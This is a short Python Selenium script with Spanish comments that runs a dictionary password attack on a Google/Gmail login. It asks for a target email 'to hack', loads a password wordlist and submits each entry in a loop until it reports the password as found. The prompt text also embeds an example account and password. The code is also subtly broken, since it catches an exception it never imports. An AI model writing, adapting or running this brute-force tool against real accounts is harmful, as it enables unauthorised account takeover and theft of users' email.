from selenium.webdriver.edge.service import Service
from webdriver_manager.microsoft import EdgeChromiumDriverManager
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

# Asegúrate de que también has importado EdgeOptions correctamente
from selenium.webdriver.edge.options import Options as EdgeOptions
import time
edge_options = EdgeOptions()
# Configura tus opciones de Edge aquí

driver = webdriver.Edge(service=Service(EdgeChromiumDriverManager().install()), options=edge_options)


# Abre la página web con el formulario
url = 'https://accounts.google.com/InteractiveLogin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%3Fhl%3Des&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%3Fhl%3Des&hl=es&osid=1&passive=1209600&service=mail&ifkv=ASKXGp1h8DSQEQhpZJO-zQiy5CIzTYAFjhJ4vEdCO6s0mZIM3741y6oTp76I9pO5WnbMAlzg15MaPA&theme=glif&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
driver.get(url)

# Encuentra los elementos del formulario y rellénalos
email = WebDriverWait(driver, 10).until(
    EC.visibility_of_element_located((By.NAME, 'identifier'))
)
email.send_keys(input("Escribe el correo para hackear: (en mi ejemplo es: javidihack@gmail.com, y su contraseña: Solar123)"))

# Encuentra y haz clic en el botón de enviar
boton_siguiente = driver.find_element(By.XPATH, "//span[contains(text(), 'Siguiente')]")
boton_siguiente.click()

password = WebDriverWait(driver, 10).until(
	EC.visibility_of_element_located((By.NAME, 'Passwd'))
)
with open(input("Introduce la ruta del diccionario de contraseñas: "), 'r', errors='ignore') as archivo:
    passwordsList = [linea.strip() for linea in archivo]
pos = 0
while True:
	try:
		password = WebDriverWait(driver, 10).until(
			EC.visibility_of_element_located((By.NAME, 'Passwd'))
		)
		password.send_keys(passwordsList[pos])
  
		boton_siguiente = driver.find_element(By.XPATH, "//span[contains(text(), 'Siguiente')]")
		boton_siguiente.click()
		pos+=1
		time.sleep(2)		
	except NoSuchElementException:
		print(f"Contraseña encontrada!\n	La contraseña es: {passwordsList[pos-1]}")
		break

time.sleep(1)

